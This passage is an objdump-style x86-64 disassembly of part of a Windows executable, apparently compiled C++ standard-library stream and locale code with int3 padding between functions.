   140005617:	ff 15 eb 4c 00 00    	call   *0x4ceb(%rip)        # 0x14000a308
   14000561d:	48 85 c0             	test   %rax,%rax
   140005620:	74 0d                	je     0x14000562f
   140005622:	48 8b 08             	mov    (%rax),%rcx
   140005625:	48 8b 51 10          	mov    0x10(%rcx),%rdx
   140005629:	48 8b c8             	mov    %rax,%rcx
   14000562c:	ff d2                	call   *%rdx
   14000562e:	90                   	nop
   14000562f:	49 8b c4             	mov    %r12,%rax
   140005632:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   140005639:	41 5f                	pop    %r15
   14000563b:	41 5e                	pop    %r14
   14000563d:	41 5d                	pop    %r13
   14000563f:	41 5c                	pop    %r12
   140005641:	5f                   	pop    %rdi
   140005642:	5e                   	pop    %rsi
   140005643:	5b                   	pop    %rbx
   140005644:	c3                   	ret
   140005645:	e8 26 09 00 00       	call   0x140005f70
   14000564a:	90                   	nop
   14000564b:	cc                   	int3
   14000564c:	cc                   	int3
   14000564d:	cc                   	int3
   14000564e:	cc                   	int3
   14000564f:	cc                   	int3
   140005650:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140005655:	55                   	push   %rbp
   140005656:	56                   	push   %rsi
   140005657:	57                   	push   %rdi
   140005658:	48 83 ec 20          	sub    $0x20,%rsp
   14000565c:	48 8b e9             	mov    %rcx,%rbp
   14000565f:	33 d2                	xor    %edx,%edx
   140005661:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140005666:	ff 15 94 4a 00 00    	call   *0x4a94(%rip)        # 0x14000a100
   14000566c:	90                   	nop
   14000566d:	48 8b 05 74 d9 00 00 	mov    0xd974(%rip),%rax        # 0x140012fe8
   140005674:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140005679:	48 8b 1d 10 4c 00 00 	mov    0x4c10(%rip),%rbx        # 0x14000a290
   140005680:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   140005684:	75 34                	jne    0x1400056ba
   140005686:	33 d2                	xor    %edx,%edx
   140005688:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000568d:	ff 15 6d 4a 00 00    	call   *0x4a6d(%rip)        # 0x14000a100
   140005693:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   140005697:	75 16                	jne    0x1400056af
   140005699:	48 8b 05 e8 4b 00 00 	mov    0x4be8(%rip),%rax        # 0x14000a288
   1400056a0:	ff 00                	incl   (%rax)
   1400056a2:	48 8b 05 df 4b 00 00 	mov    0x4bdf(%rip),%rax        # 0x14000a288
   1400056a9:	48 63 08             	movslq (%rax),%rcx
   1400056ac:	48 89 0b             	mov    %rcx,(%rbx)
   1400056af:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400056b4:	ff 15 4e 4a 00 00    	call   *0x4a4e(%rip)        # 0x14000a108
   1400056ba:	48 8b 33             	mov    (%rbx),%rsi
   1400056bd:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   1400056c1:	48 8d 3c f5 00 00 00 	lea    0x0(,%rsi,8),%rdi
   1400056c8:	00 
   1400056c9:	48 3b 71 18          	cmp    0x18(%rcx),%rsi
   1400056cd:	73 0f                	jae    0x1400056de
   1400056cf:	48 8b 41 10          	mov    0x10(%rcx),%rax
   1400056d3:	48 8b 1c 07          	mov    (%rdi,%rax,1),%rbx
   1400056d7:	48 85 db             	test   %rbx,%rbx
   1400056da:	75 67                	jne    0x140005743
   1400056dc:	eb 02                	jmp    0x1400056e0
   1400056de:	33 db                	xor    %ebx,%ebx
   1400056e0:	80 79 24 00          	cmpb   $0x0,0x24(%rcx)
   1400056e4:	74 13                	je     0x1400056f9
   1400056e6:	e8 66 30 00 00       	call   0x140008751
   1400056eb:	48 3b 70 18          	cmp    0x18(%rax),%rsi
   1400056ef:	73 0d                	jae    0x1400056fe
   1400056f1:	48 8b 40 10          	mov    0x10(%rax),%rax
   1400056f5:	48 8b 1c 07          	mov    (%rdi,%rax,1),%rbx
   1400056f9:	48 85 db             	test   %rbx,%rbx
   1400056fc:	75 45                	jne    0x140005743
   1400056fe:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140005703:	48 85 db             	test   %rbx,%rbx
   140005706:	75 3b                	jne    0x140005743
   140005708:	48 8b d5             	mov    %rbp,%rdx
   14000570b:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140005710:	ff 15 2a 4a 00 00    	call   *0x4a2a(%rip)        # 0x14000a140
   140005716:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000571a:	74 42                	je     0x14000575e
   14000571c:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140005721:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140005726:	48 8b cb             	mov    %rbx,%rcx
   140005729:	e8 e6 2f 00 00       	call   0x140008714
   14000572e:	48 8b 03             	mov    (%rbx),%rax
   140005731:	48 8b cb             	mov    %rbx,%rcx
   140005734:	ff 50 08             	call   *0x8(%rax)
   140005737:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000573c:	48 89 1d a5 d8 00 00 	mov    %rbx,0xd8a5(%rip)        # 0x140012fe8
   140005743:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140005748:	ff 15 ba 49 00 00    	call   *0x49ba(%rip)        # 0x14000a108
   14000574e:	48 8b c3             	mov    %rbx,%rax
   140005751:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140005756:	48 83 c4 20          	add    $0x20,%rsp
   14000575a:	5f                   	pop    %rdi
   14000575b:	5e                   	pop    %rsi
   14000575c:	5d                   	pop    %rbp
   14000575d:	c3                   	ret
   14000575e:	e8 0d 08 00 00       	call   0x140005f70
   140005763:	90                   	nop
   140005764:	cc                   	int3
   140005765:	cc                   	int3
   140005766:	cc                   	int3
   140005767:	cc                   	int3
   140005768:	cc                   	int3
   140005769:	cc                   	int3
   14000576a:	cc                   	int3
   14000576b:	cc                   	int3
   14000576c:	cc                   	int3
   14000576d:	cc                   	int3
   14000576e:	cc                   	int3
   14000576f:	cc                   	int3
   140005770:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005775:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000577a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000577f:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140005784:	57                   	push   %rdi
   140005785:	41 56                	push   %r14
   140005787:	41 57                	push   %r15
   140005789:	48 83 ec 70          	sub    $0x70,%rsp
   14000578d:	41 8b e9             	mov    %r9d,%ebp
   140005790:	41 8b f0             	mov    %r8d,%esi
   140005793:	4c 8b f2             	mov    %rdx,%r14
   140005796:	48 8b d9             	mov    %rcx,%rbx
   140005799:	45 33 ff             	xor    %r15d,%r15d
   14000579c:	44 89 7c 24 40       	mov    %r15d,0x40(%rsp)
   1400057a1:	44 39 bc 24 b0 00 00 	cmp    %r15d,0xb0(%rsp)
   1400057a8:	00 
   1400057a9:	74 20                	je     0x1400057cb
   1400057ab:	48 8d 05 86 5e 00 00 	lea    0x5e86(%rip),%rax        # 0x14000b638
   1400057b2:	48 89 01             	mov    %rax,(%rcx)
   1400057b5:	48 81 c1 a8 00 00 00 	add    $0xa8,%rcx
   1400057bc:	ff 15 56 4a 00 00    	call   *0x4a56(%rip)        # 0x14000a218
   1400057c2:	90                   	nop
   1400057c3:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   1400057ca:	00 
   1400057cb:	45 33 c9             	xor    %r9d,%r9d
   1400057ce:	45 33 c0             	xor    %r8d,%r8d
   1400057d1:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400057d5:	48 8b cb             	mov    %rbx,%rcx
   1400057d8:	ff 15 42 4a 00 00    	call   *0x4a42(%rip)        # 0x14000a220
   1400057de:	90                   	nop
   1400057df:	48 8b 03             	mov    (%rbx),%rax
   1400057e2:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400057e6:	48 8d 05 43 5e 00 00 	lea    0x5e43(%rip),%rax        # 0x14000b630
   1400057ed:	48 89 04 19          	mov    %rax,(%rcx,%rbx,1)
   1400057f1:	48 8b 03             	mov    (%rbx),%rax
   1400057f4:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400057f8:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   1400057fe:	89 54 19 fc          	mov    %edx,-0x4(%rcx,%rbx,1)
   140005802:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   140005806:	ff 15 44 49 00 00    	call   *0x4944(%rip)        # 0x14000a150
   14000580c:	48 8d 05 9d 5d 00 00 	lea    0x5d9d(%rip),%rax        # 0x14000b5b0
   140005813:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140005817:	c6 83 84 00 00 00 00 	movb   $0x0,0x84(%rbx)
   14000581e:	c6 43 79 00          	movb   $0x0,0x79(%rbx)
   140005822:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   140005826:	ff 15 bc 49 00 00    	call   *0x49bc(%rip)        # 0x14000a1e8
   14000582c:	4c 89 bb 88 00 00 00 	mov    %r15,0x88(%rbx)
   140005833:	48 8b 05 b6 d7 00 00 	mov    0xd7b6(%rip),%rax        # 0x140012ff0
   14000583a:	48 89 43 7c          	mov    %rax,0x7c(%rbx)
   14000583e:	4c 89 7b 70          	mov    %r15,0x70(%rbx)
   140005842:	83 ce 02             	or     $0x2,%esi
   140005845:	44 8b c5             	mov    %ebp,%r8d
   140005848:	8b d6                	mov    %esi,%edx
   14000584a:	49 8b ce             	mov    %r14,%rcx
   14000584d:	e8 11 2f 00 00       	call   0x140008763
   140005852:	48 8b f0             	mov    %rax,%rsi
   140005855:	48 85 c0             	test   %rax,%rax
   140005858:	0f 84 df 00 00 00    	je     0x14000593d
   14000585e:	c6 83 84 00 00 00 01 	movb   $0x1,0x84(%rbx)
   140005865:	c6 43 79 00          	movb   $0x0,0x79(%rbx)
   140005869:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   14000586d:	ff 15 75 49 00 00    	call   *0x4975(%rip)        # 0x14000a1e8
   140005873:	4c 89 7c 24 58       	mov    %r15,0x58(%rsp)
   140005878:	4c 89 7c 24 50       	mov    %r15,0x50(%rsp)
   14000587d:	4c 89 7c 24 48       	mov    %r15,0x48(%rsp)
   140005882:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   140005887:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   14000588c:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   140005891:	48 8b ce             	mov    %rsi,%rcx
   140005894:	ff 15 6e 4c 00 00    	call   *0x4c6e(%rip)        # 0x14000a508
   14000589a:	4c 8b 4c 24 48       	mov    0x48(%rsp),%r9
   14000589f:	4c 89 4c 24 30       	mov    %r9,0x30(%rsp)
   1400058a4:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
   1400058a9:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   1400058ae:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   1400058b3:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1400058b8:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   1400058bc:	ff 15 2e 49 00 00    	call   *0x492e(%rip)        # 0x14000a1f0
   1400058c2:	48 89 b3 88 00 00 00 	mov    %rsi,0x88(%rbx)
   1400058c9:	48 8b 05 20 d7 00 00 	mov    0xd720(%rip),%rax        # 0x140012ff0
   1400058d0:	48 89 43 7c          	mov    %rax,0x7c(%rbx)
   1400058d4:	4c 89 7b 70          	mov    %r15,0x70(%rbx)
   1400058d8:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   1400058dd:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   1400058e1:	ff 15 79 48 00 00    	call   *0x4879(%rip)        # 0x14000a160
   1400058e7:	90                   	nop
   1400058e8:	48 8b c8             	mov    %rax,%rcx
   1400058eb:	e8 60 fd ff ff       	call   0x140005650
   1400058f0:	48 8b f0             	mov    %rax,%rsi
   1400058f3:	48 8b c8             	mov    %rax,%rcx
   1400058f6:	ff 15 24 48 00 00    	call   *0x4824(%rip)        # 0x14000a120
   1400058fc:	84 c0                	test   %al,%al
   1400058fe:	74 06                	je     0x140005906
   140005900:	4c 89 7b 70          	mov    %r15,0x70(%rbx)
   140005904:	eb 0f                	jmp    0x140005915
   140005906:	48 89 73 70          	mov    %rsi,0x70(%rbx)
   14000590a:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   14000590e:	ff 15 d4 48 00 00    	call   *0x48d4(%rip)        # 0x14000a1e8
   140005914:	90                   	nop
   140005915:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   14000591a:	48 85 c9             	test   %rcx,%rcx
   14000591d:	74 37                	je     0x140005956
   14000591f:	48 8b 01             	mov    (%rcx),%rax
   140005922:	ff 50 10             	call   *0x10(%rax)
   140005925:	48 85 c0             	test   %rax,%rax
   140005928:	74 2c                	je     0x140005956
   14000592a:	48 8b 08             	mov    (%rax),%rcx
   14000592d:	4c 8b 01             	mov    (%rcx),%r8
   140005930:	ba 01 00 00 00       	mov    $0x1,%edx
   140005935:	48 8b c8             	mov    %rax,%rcx
   140005938:	41 ff d0             	call   *%r8
   14000593b:	eb 19                	jmp    0x140005956
   14000593d:	48 8b 03             	mov    (%rbx),%rax
   140005940:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140005944:	48 03 cb             	add    %rbx,%rcx
   140005947:	45 33 c0             	xor    %r8d,%r8d
   14000594a:	ba 02 00 00 00       	mov    $0x2,%edx
   14000594f:	ff 15 53 49 00 00    	call   *0x4953(%rip)        # 0x14000a2a8
   140005955:	90                   	nop
   140005956:	48 8b c3             	mov    %rbx,%rax
   140005959:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   14000595e:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140005962:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   140005966:	49 8b 73 38          	mov    0x38(%r11),%rsi
   14000596a:	49 8b e3             	mov    %r11,%rsp
   14000596d:	41 5f                	pop    %r15
   14000596f:	41 5e                	pop    %r14
   140005971:	5f                   	pop    %rdi
   140005972:	c3                   	ret
   140005973:	cc                   	int3
   140005974:	cc                   	int3
   140005975:	cc                   	int3
   140005976:	cc                   	int3
   140005977:	cc                   	int3
   140005978:	cc                   	int3
   140005979:	cc                   	int3
   14000597a:	cc                   	int3
   14000597b:	cc                   	int3
   14000597c:	cc                   	int3
   14000597d:	cc                   	int3
   14000597e:	cc                   	int3
   14000597f:	cc                   	int3
   140005980:	40 53                	rex push %rbx
   140005982:	48 83 ec 20          	sub    $0x20,%rsp
   140005986:	48 8b d9             	mov    %rcx,%rbx
   140005989:	48 8b c2             	mov    %rdx,%rax
   14000598c:	48 8d 0d 95 4c 00 00 	lea    0x4c95(%rip),%rcx        # 0x14000a628
   140005993:	0f 57 c0             	xorps  %xmm0,%xmm0
   140005996:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000599a:	48 89 0b             	mov    %rcx,(%rbx)
   14000599d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400059a1:	0f 11 02             	movups %xmm0,(%rdx)
   1400059a4:	e8 7d 3c 00 00       	call   0x140009626
   1400059a9:	48 8d 05 28 5b 00 00 	lea    0x5b28(%rip),%rax        # 0x14000b4d8
   1400059b0:	48 89 03             	mov    %rax,(%rbx)
   1400059b3:	48 8b c3             	mov    %rbx,%rax
   1400059b6:	48 83 c4 20          	add    $0x20,%rsp
   1400059ba:	5b                   	pop    %rbx
   1400059bb:	c3                   	ret
   1400059bc:	cc                   	int3
   1400059bd:	cc                   	int3
   1400059be:	cc                   	int3
   1400059bf:	cc                   	int3
   1400059c0:	48 8d 05 21 5b 00 00 	lea    0x5b21(%rip),%rax        # 0x14000b4e8
   1400059c7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1400059ce:	00 
   1400059cf:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1400059d3:	48 8d 05 fe 5a 00 00 	lea    0x5afe(%rip),%rax        # 0x14000b4d8
   1400059da:	48 89 01             	mov    %rax,(%rcx)
   1400059dd:	48 8b c1             	mov    %rcx,%rax
   1400059e0:	c3                   	ret
   1400059e1:	cc                   	int3
   1400059e2:	cc                   	int3
   1400059e3:	cc                   	int3
   1400059e4:	cc                   	int3
   1400059e5:	cc                   	int3
   1400059e6:	cc                   	int3
   1400059e7:	cc                   	int3
   1400059e8:	cc                   	int3
   1400059e9:	cc                   	int3
   1400059ea:	cc                   	int3
   1400059eb:	cc                   	int3
   1400059ec:	cc                   	int3
   1400059ed:	cc                   	int3
   1400059ee:	cc                   	int3
   1400059ef:	cc                   	int3
   1400059f0:	40 53                	rex push %rbx
   1400059f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400059f6:	48 8b d9             	mov    %rcx,%rbx
   1400059f9:	48 8d 05 b0 5b 00 00 	lea    0x5bb0(%rip),%rax        # 0x14000b5b0
   140005a00:	48 89 01             	mov    %rax,(%rcx)
   140005a03:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140005a0a:	00 
   140005a0b:	74 29                	je     0x140005a36
   140005a0d:	ff 15 55 47 00 00    	call   *0x4755(%rip)        # 0x14000a168
   140005a13:	48 8d 53 70          	lea    0x70(%rbx),%rdx
   140005a17:	48 3b c2             	cmp    %rdx,%rax
   140005a1a:	75 1a                	jne    0x140005a36
   140005a1c:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   140005a23:	4c 8b 8b 90 00 00 00 	mov    0x90(%rbx),%r9
   140005a2a:	4c 8b c2             	mov    %rdx,%r8
   140005a2d:	48 8b cb             	mov    %rbx,%rcx
   140005a30:	ff 15 62 47 00 00    	call   *0x4762(%rip)        # 0x14000a198
   140005a36:	80 7b 7c 00          	cmpb   $0x0,0x7c(%rbx)
   140005a3a:	74 08                	je     0x140005a44
   140005a3c:	48 8b cb             	mov    %rbx,%rcx
   140005a3f:	e8 6c 05 00 00       	call   0x140005fb0
   140005a44:	48 8b cb             	mov    %rbx,%rcx
   140005a47:	48 83 c4 20          	add    $0x20,%rsp
   140005a4b:	5b                   	pop    %rbx
   140005a4c:	48 ff 25 05 47 00 00 	rex.W jmp *0x4705(%rip)        # 0x14000a158
   140005a53:	cc                   	int3
   140005a54:	cc                   	int3
   140005a55:	cc                   	int3
   140005a56:	cc                   	int3
   140005a57:	cc                   	int3
   140005a58:	cc                   	int3
   140005a59:	cc                   	int3
   140005a5a:	cc                   	int3
   140005a5b:	cc                   	int3
   140005a5c:	cc                   	int3
   140005a5d:	cc                   	int3
   140005a5e:	cc                   	int3
   140005a5f:	cc                   	int3
   140005a60:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005a65:	57                   	push   %rdi
   140005a66:	48 83 ec 30          	sub    $0x30,%rsp
   140005a6a:	f6 41 70 01          	testb  $0x1,0x70(%rcx)
   140005a6e:	48 8d 05 8b 5a 00 00 	lea    0x5a8b(%rip),%rax        # 0x14000b500
   140005a75:	48 89 01             	mov    %rax,(%rcx)
   140005a78:	48 8b d9             	mov    %rcx,%rbx
   140005a7b:	74 60                	je     0x140005add
   140005a7d:	ff 15 fd 46 00 00    	call   *0x46fd(%rip)        # 0x14000a180
   140005a83:	48 8b cb             	mov    %rbx,%rcx
   140005a86:	48 85 c0             	test   %rax,%rax
   140005a89:	74 08                	je     0x140005a93
   140005a8b:	ff 15 0f 47 00 00    	call   *0x470f(%rip)        # 0x14000a1a0
   140005a91:	eb 06                	jmp    0x140005a99
   140005a93:	ff 15 ef 46 00 00    	call   *0x46ef(%rip)        # 0x14000a188
   140005a99:	48 8b cb             	mov    %rbx,%rcx
   140005a9c:	48 8b f8             	mov    %rax,%rdi
   140005a9f:	ff 15 c3 46 00 00    	call   *0x46c3(%rip)        # 0x14000a168
   140005aa5:	48 8b cb             	mov    %rbx,%rcx
   140005aa8:	48 2b f8             	sub    %rax,%rdi
   140005aab:	ff 15 b7 46 00 00    	call   *0x46b7(%rip)        # 0x14000a168
   140005ab1:	48 81 ff 00 10 00 00 	cmp    $0x1000,%rdi
   140005ab8:	72 18                	jb     0x140005ad2
   140005aba:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140005abe:	48 83 c7 27          	add    $0x27,%rdi
   140005ac2:	48 2b c1             	sub    %rcx,%rax
   140005ac5:	48 83 e8 08          	sub    $0x8,%rax
   140005ac9:	48 83 f8 1f          	cmp    $0x1f,%rax
   140005acd:	77 4d                	ja     0x140005b1c
   140005acf:	48 8b c1             	mov    %rcx,%rax
   140005ad2:	48 8b d7             	mov    %rdi,%rdx
   140005ad5:	48 8b c8             	mov    %rax,%rcx
   140005ad8:	e8 fb 2c 00 00       	call   0x1400087d8
   140005add:	45 33 c9             	xor    %r9d,%r9d
   140005ae0:	45 33 c0             	xor    %r8d,%r8d
   140005ae3:	33 d2                	xor    %edx,%edx
   140005ae5:	48 8b cb             	mov    %rbx,%rcx
   140005ae8:	ff 15 aa 46 00 00    	call   *0x46aa(%rip)        # 0x14000a198
   140005aee:	45 33 c0             	xor    %r8d,%r8d
   140005af1:	33 d2                	xor    %edx,%edx
   140005af3:	48 8b cb             	mov    %rbx,%rcx
   140005af6:	ff 15 cc 46 00 00    	call   *0x46cc(%rip)        # 0x14000a1c8
   140005afc:	83 63 70 fe          	andl   $0xfffffffe,0x70(%rbx)
   140005b00:	48 8b cb             	mov    %rbx,%rcx
   140005b03:	48 c7 43 68 00 00 00 	movq   $0x0,0x68(%rbx)
   140005b0a:	00 
   140005b0b:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005b10:	48 83 c4 30          	add    $0x30,%rsp
   140005b14:	5f                   	pop    %rdi
   140005b15:	48 ff 25 3c 46 00 00 	rex.W jmp *0x463c(%rip)        # 0x14000a158
   140005b1c:	45 33 c9             	xor    %r9d,%r9d
   140005b1f:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140005b26:	00 00 
   140005b28:	45 33 c0             	xor    %r8d,%r8d
   140005b2b:	33 d2                	xor    %edx,%edx
   140005b2d:	33 c9                	xor    %ecx,%ecx
   140005b2f:	ff 15 33 49 00 00    	call   *0x4933(%rip)        # 0x14000a468
   140005b35:	cc                   	int3
   140005b36:	cc                   	int3
   140005b37:	cc                   	int3
   140005b38:	cc                   	int3
   140005b39:	cc                   	int3
   140005b3a:	cc                   	int3
   140005b3b:	cc                   	int3
   140005b3c:	cc                   	int3
   140005b3d:	cc                   	int3
   140005b3e:	cc                   	int3
   140005b3f:	cc                   	int3
   140005b40:	48 8b 09             	mov    (%rcx),%rcx
   140005b43:	48 85 c9             	test   %rcx,%rcx
   140005b46:	74 0b                	je     0x140005b53
   140005b48:	48 8b 01             	mov    (%rcx),%rax
   140005b4b:	ba 01 00 00 00       	mov    $0x1,%edx
   140005b50:	48 ff 20             	rex.W jmp *(%rax)
   140005b53:	c3                   	ret
   140005b54:	cc                   	int3
   140005b55:	cc                   	int3
   140005b56:	cc                   	int3
   140005b57:	cc                   	int3
   140005b58:	cc                   	int3
   140005b59:	cc                   	int3
   140005b5a:	cc                   	int3
   140005b5b:	cc                   	int3
   140005b5c:	cc                   	int3
   140005b5d:	cc                   	int3
   140005b5e:	cc                   	int3
   140005b5f:	cc                   	int3
   140005b60:	48 83 ec 28          	sub    $0x28,%rsp
   140005b64:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140005b68:	48 85 c9             	test   %rcx,%rcx
   140005b6b:	74 20                	je     0x140005b8d
   140005b6d:	48 8b 01             	mov    (%rcx),%rax
   140005b70:	ff 50 10             	call   *0x10(%rax)
   140005b73:	48 85 c0             	test   %rax,%rax
   140005b76:	74 15                	je     0x140005b8d
   140005b78:	48 8b 08             	mov    (%rax),%rcx
   140005b7b:	ba 01 00 00 00       	mov    $0x1,%edx
   140005b80:	4c 8b 01             	mov    (%rcx),%r8
   140005b83:	48 8b c8             	mov    %rax,%rcx
   140005b86:	48 83 c4 28          	add    $0x28,%rsp
   140005b8a:	49 ff e0             	rex.WB jmp *%r8
   140005b8d:	48 83 c4 28          	add    $0x28,%rsp
   140005b91:	c3                   	ret
   140005b92:	cc                   	int3
   140005b93:	cc                   	int3
   140005b94:	cc                   	int3
   140005b95:	cc                   	int3
   140005b96:	cc                   	int3
   140005b97:	cc                   	int3
   140005b98:	cc                   	int3
   140005b99:	cc                   	int3
   140005b9a:	cc                   	int3
   140005b9b:	cc                   	int3
   140005b9c:	cc                   	int3
   140005b9d:	cc                   	int3
   140005b9e:	cc                   	int3
   140005b9f:	cc                   	int3
   140005ba0:	40 53                	rex push %rbx
   140005ba2:	48 83 ec 20          	sub    $0x20,%rsp
   140005ba6:	48 8b 01             	mov    (%rcx),%rax
   140005ba9:	48 8d 99 a8 00 00 00 	lea    0xa8(%rcx),%rbx
   140005bb0:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140005bb4:	48 8d 05 75 5a 00 00 	lea    0x5a75(%rip),%rax        # 0x14000b630
   140005bbb:	48 89 84 1a 58 ff ff 	mov    %rax,-0xa8(%rdx,%rbx,1)
   140005bc2:	ff 
   140005bc3:	48 8b 01             	mov    (%rcx),%rax
   140005bc6:	48 83 c1 08          	add    $0x8,%rcx
   140005bca:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140005bce:	44 8d 82 58 ff ff ff 	lea    -0xa8(%rdx),%r8d
   140005bd5:	44 89 84 1a 54 ff ff 	mov    %r8d,-0xac(%rdx,%rbx,1)
   140005bdc:	ff 
   140005bdd:	e8 0e fe ff ff       	call   0x1400059f0
   140005be2:	48 8d 8b 68 ff ff ff 	lea    -0x98(%rbx),%rcx
   140005be9:	ff 15 39 46 00 00    	call   *0x4639(%rip)        # 0x14000a228
   140005bef:	48 8b cb             	mov    %rbx,%rcx
   140005bf2:	48 83 c4 20          	add    $0x20,%rsp
   140005bf6:	5b                   	pop    %rbx
   140005bf7:	48 ff 25 12 46 00 00 	rex.W jmp *0x4612(%rip)        # 0x14000a210
   140005bfe:	cc                   	int3
   140005bff:	cc                   	int3
   140005c00:	40 53                	rex push %rbx
   140005c02:	48 83 ec 20          	sub    $0x20,%rsp
   140005c06:	48 8b 01             	mov    (%rcx),%rax
   140005c09:	48 8d 99 88 00 00 00 	lea    0x88(%rcx),%rbx
   140005c10:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140005c14:	48 8d 05 65 59 00 00 	lea    0x5965(%rip),%rax        # 0x14000b580
   140005c1b:	48 89 84 1a 78 ff ff 	mov    %rax,-0x88(%rdx,%rbx,1)
   140005c22:	ff 
   140005c23:	48 8b 01             	mov    (%rcx),%rax
   140005c26:	48 83 c1 08          	add    $0x8,%rcx
   140005c2a:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140005c2e:	44 8d 82 78 ff ff ff 	lea    -0x88(%rdx),%r8d
   140005c35:	44 89 84 1a 74 ff ff 	mov    %r8d,-0x8c(%rdx,%rbx,1)
   140005c3c:	ff 
   140005c3d:	e8 1e fe ff ff       	call   0x140005a60
   140005c42:	48 8d 4b 88          	lea    -0x78(%rbx),%rcx
   140005c46:	ff 15 dc 45 00 00    	call   *0x45dc(%rip)        # 0x14000a228
   140005c4c:	48 8b cb             	mov    %rbx,%rcx
   140005c4f:	48 83 c4 20          	add    $0x20,%rsp
   140005c53:	5b                   	pop    %rbx
   140005c54:	48 ff 25 b5 45 00 00 	rex.W jmp *0x45b5(%rip)        # 0x14000a210
   140005c5b:	cc                   	int3
   140005c5c:	48 63 41 fc          	movslq -0x4(%rcx),%rax
   140005c60:	48 2b c8             	sub    %rax,%rcx
   140005c63:	e9 58 00 00 00       	jmp    0x140005cc0
   140005c68:	48 63 41 fc          	movslq -0x4(%rcx),%rax
   140005c6c:	48 2b c8             	sub    %rax,%rcx
   140005c6f:	e9 dc 00 00 00       	jmp    0x140005d50
   140005c74:	cc                   	int3
   140005c75:	cc                   	int3
   140005c76:	cc                   	int3
   140005c77:	cc                   	int3
   140005c78:	cc                   	int3
   140005c79:	cc                   	int3
   140005c7a:	cc                   	int3
   140005c7b:	cc                   	int3
   140005c7c:	cc                   	int3
   140005c7d:	cc                   	int3
   140005c7e:	cc                   	int3
   140005c7f:	cc                   	int3
   140005c80:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005c85:	57                   	push   %rdi
   140005c86:	48 83 ec 20          	sub    $0x20,%rsp
   140005c8a:	8b da                	mov    %edx,%ebx
   140005c8c:	48 8b f9             	mov    %rcx,%rdi
   140005c8f:	e8 5c fd ff ff       	call   0x1400059f0
   140005c94:	f6 c3 01             	test   $0x1,%bl
   140005c97:	74 0d                	je     0x140005ca6
   140005c99:	ba 98 00 00 00       	mov    $0x98,%edx
   140005c9e:	48 8b cf             	mov    %rdi,%rcx
   140005ca1:	e8 32 2b 00 00       	call   0x1400087d8
   140005ca6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005cab:	48 8b c7             	mov    %rdi,%rax
   140005cae:	48 83 c4 20          	add    $0x20,%rsp
   140005cb2:	5f                   	pop    %rdi
   140005cb3:	c3                   	ret
   140005cb4:	cc                   	int3
   140005cb5:	cc                   	int3
   140005cb6:	cc                   	int3
   140005cb7:	cc                   	int3
   140005cb8:	cc                   	int3
   140005cb9:	cc                   	int3
   140005cba:	cc                   	int3
   140005cbb:	cc                   	int3
   140005cbc:	cc                   	int3
   140005cbd:	cc                   	int3
   140005cbe:	cc                   	int3
   140005cbf:	cc                   	int3
   140005cc0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005cc5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140005cca:	57                   	push   %rdi
